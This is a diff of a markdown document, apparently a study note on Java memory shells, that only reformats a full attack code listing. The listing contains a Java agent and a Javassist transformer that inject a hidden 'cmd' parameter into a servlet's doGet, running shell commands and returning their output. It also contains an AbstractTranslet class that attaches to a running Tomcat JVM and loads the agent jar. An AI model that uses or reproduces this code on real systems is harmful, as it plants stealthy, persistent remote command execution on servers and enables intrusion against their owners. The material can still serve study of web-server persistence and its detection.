@@ -18,107 +18,109 @@ Firstly, we need to find a target class which can be hooked and exploited. Then 
 
 ## Code
 
-    public class AgentMain {
-        public static final String ClassName = "com.index.IndexServlet";
+```java
+public class AgentMain {
+    public static final String ClassName = "com.index.IndexServlet";
 
-        public static void agentmain(String args, Instrumentation inst) {
-            inst.addTransformer(new Transformer(), true);
-            Class[] loadedClasses = inst.getAllLoadedClasses();
-            for (Class loadedClass : loadedClasses) {
-                if(loadedClass.getName().equals(ClassName)) {
-                    try {
-                        inst.retransformClasses(loadedClass);
-                    } catch (UnmodifiableClassException e) {
-                        e.printStackTrace();
-                    }
-                }
-            }
-
-        }
-    }
-
-    public class Transformer implements ClassFileTransformer {
-        public static final String ClassName = "com.index.IndexServlet";
-
-        @Override
-        public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
-            className = className.replace("/", ".");
-            if(className.equals(ClassName)) {
-                System.out.println("Got it");
-                ClassPool classPool = ClassPool.getDefault();
-                ClassClassPath classPath = new ClassClassPath(classBeingRedefined);
-                classPool.insertClassPath(classPath);
+    public static void agentmain(String args, Instrumentation inst) {
+        inst.addTransformer(new Transformer(), true);
+        Class[] loadedClasses = inst.getAllLoadedClasses();
+        for (Class loadedClass : loadedClasses) {
+            if(loadedClass.getName().equals(ClassName)) {
                 try {
-                    CtClass ctClass = classPool.getCtClass(className);
-                    CtMethod method = ctClass.getDeclaredMethod("doGet");
-                    method.insertBefore("java.lang.System.out.println(\"insert success\");\n" +
-                            "if (req.getParameter(\"cmd\") != null) {\n" +
-                            "   java.lang.String cmd = req.getParameter(\"cmd\");\n" +
-                            "   boolean isLinux = true;\n" +
-                            "   java.lang.String osType = java.lang.System.getProperty(\"os.name\");\n" +
-                            "   if (osType != null && osType.toLowerCase().contains(\"win\")) {\n" +
-                            "       isLinux = false;\n" +
-                            "   }\n" +
-                            "   java.lang.String[] cmds = isLinux ? new java.lang.String[]{\"sh\", \"-c\", cmd} : new java.lang.String[]{\"cmd.exe\", \"/c\", cmd};\n" +
-                            "   java.io.InputStream in = java.lang.Runtime.getRuntime().exec(cmds).getInputStream();\n" +
-                            "   java.util.Scanner s = new java.util.Scanner(in).useDelimiter(\"\\\\a\");\n" +
-                            "   java.lang.String output = s.hasNext() ? s.next() : \"\";\n" +
-                            "   java.io.PrintWriter out = resp.getWriter();\n" +
-                            "   out.println(output);\n" +
-                            "   out.flush();\n" +
-                            "   out.close();\n" +
-                            "}\n");
-                    byte[] bytes = ctClass.toBytecode();
-                    ctClass.detach();
-                    return bytes;
-                } catch (NotFoundException | CannotCompileException | IOException e) {
+                    inst.retransformClasses(loadedClass);
+                } catch (UnmodifiableClassException e) {
                     e.printStackTrace();
                 }
             }
-            return new byte[0];
         }
+
     }
+}
 
-    public class EvilAttach extends AbstractTranslet {
-        static {
-            final String path = "D:\\MemoryShellStudy\\EvilAgent\\target\\EvilAgent-1.0-SNAPSHOT-jar-with-dependencies.jar";
-            File file = new File(System.getProperty("java.home").replace("jre", "lib") + File.separator + "tools.jar");
+public class Transformer implements ClassFileTransformer {
+    public static final String ClassName = "com.index.IndexServlet";
 
+    @Override
+    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
+        className = className.replace("/", ".");
+        if(className.equals(ClassName)) {
+            System.out.println("Got it");
+            ClassPool classPool = ClassPool.getDefault();
+            ClassClassPath classPath = new ClassClassPath(classBeingRedefined);
+            classPool.insertClassPath(classPath);
             try {
-                URL url = file.toURI().toURL();
-                System.out.println(url);
-                URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{url});
-                Class<?> VirtualMachine = urlClassLoader.loadClass("com.sun.tools.attach.VirtualMachine");
-                Class<?> VirtualMachineDescriptor = urlClassLoader.loadClass("com.sun.tools.attach.VirtualMachineDescriptor");
-                Method listMethod = VirtualMachine.getDeclaredMethod("list", null);
-                List list = (List) listMethod.invoke(VirtualMachine, null);
-
-                for (Object o : list) {
-                    Method displayName = VirtualMachineDescriptor.getDeclaredMethod("displayName");
-                    String name = (String) displayName.invoke(o, null);
-                    System.out.println(name);
-                    if(name.contains("org.apache.catalina.startup.Bootstrap")) {
-                        Method attach = VirtualMachine.getDeclaredMethod("attach", VirtualMachineDescriptor);
-                        Object vm = attach.invoke(VirtualMachine, o);
-                        Method loadAgent = VirtualMachine.getDeclaredMethod("loadAgent", String.class);
-                        loadAgent.invoke(vm, path);
-                        System.out.println("inject success");
-                        Method detach = VirtualMachine.getDeclaredMethod("detach", null);
-                        detach.invoke(vm, null);
-                    }
-                }
-            } catch (MalformedURLException | ClassNotFoundException | InvocationTargetException | NoSuchMethodException | IllegalAccessException e) {
+                CtClass ctClass = classPool.getCtClass(className);
+                CtMethod method = ctClass.getDeclaredMethod("doGet");
+                method.insertBefore("java.lang.System.out.println(\"insert success\");\n" +
+                        "if (req.getParameter(\"cmd\") != null) {\n" +
+                        "   java.lang.String cmd = req.getParameter(\"cmd\");\n" +
+                        "   boolean isLinux = true;\n" +
+                        "   java.lang.String osType = java.lang.System.getProperty(\"os.name\");\n" +
+                        "   if (osType != null && osType.toLowerCase().contains(\"win\")) {\n" +
+                        "       isLinux = false;\n" +
+                        "   }\n" +
+                        "   java.lang.String[] cmds = isLinux ? new java.lang.String[]{\"sh\", \"-c\", cmd} : new java.lang.String[]{\"cmd.exe\", \"/c\", cmd};\n" +
+                        "   java.io.InputStream in = java.lang.Runtime.getRuntime().exec(cmds).getInputStream();\n" +
+                        "   java.util.Scanner s = new java.util.Scanner(in).useDelimiter(\"\\\\a\");\n" +
+                        "   java.lang.String output = s.hasNext() ? s.next() : \"\";\n" +
+                        "   java.io.PrintWriter out = resp.getWriter();\n" +
+                        "   out.println(output);\n" +
+                        "   out.flush();\n" +
+                        "   out.close();\n" +
+                        "}\n");
+                byte[] bytes = ctClass.toBytecode();
+                ctClass.detach();
+                return bytes;
+            } catch (NotFoundException | CannotCompileException | IOException e) {
                 e.printStackTrace();
             }
         }
+        return new byte[0];
+    }
+}
 
-        @Override
-        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+public class EvilAttach extends AbstractTranslet {
+    static {
+        final String path = "D:\\MemoryShellStudy\\EvilAgent\\target\\EvilAgent-1.0-SNAPSHOT-jar-with-dependencies.jar";
+        File file = new File(System.getProperty("java.home").replace("jre", "lib") + File.separator + "tools.jar");
 
-        }
+        try {
+            URL url = file.toURI().toURL();
+            System.out.println(url);
+            URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{url});
+            Class<?> VirtualMachine = urlClassLoader.loadClass("com.sun.tools.attach.VirtualMachine");
+            Class<?> VirtualMachineDescriptor = urlClassLoader.loadClass("com.sun.tools.attach.VirtualMachineDescriptor");
+            Method listMethod = VirtualMachine.getDeclaredMethod("list", null);
+            List list = (List) listMethod.invoke(VirtualMachine, null);
 
-        @Override
-        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
-
+            for (Object o : list) {
+                Method displayName = VirtualMachineDescriptor.getDeclaredMethod("displayName");
+                String name = (String) displayName.invoke(o, null);
+                System.out.println(name);
+                if(name.contains("org.apache.catalina.startup.Bootstrap")) {
+                    Method attach = VirtualMachine.getDeclaredMethod("attach", VirtualMachineDescriptor);
+                    Object vm = attach.invoke(VirtualMachine, o);
+                    Method loadAgent = VirtualMachine.getDeclaredMethod("loadAgent", String.class);
+                    loadAgent.invoke(vm, path);
+                    System.out.println("inject success");
+                    Method detach = VirtualMachine.getDeclaredMethod("detach", null);
+                    detach.invoke(vm, null);
+                }
+            }
+        } catch (MalformedURLException | ClassNotFoundException | InvocationTargetException | NoSuchMethodException | IllegalAccessException e) {
+            e.printStackTrace();
         }
     }
+
+    @Override
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+
+    }
+
+    @Override
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+
+    }
+}
+```
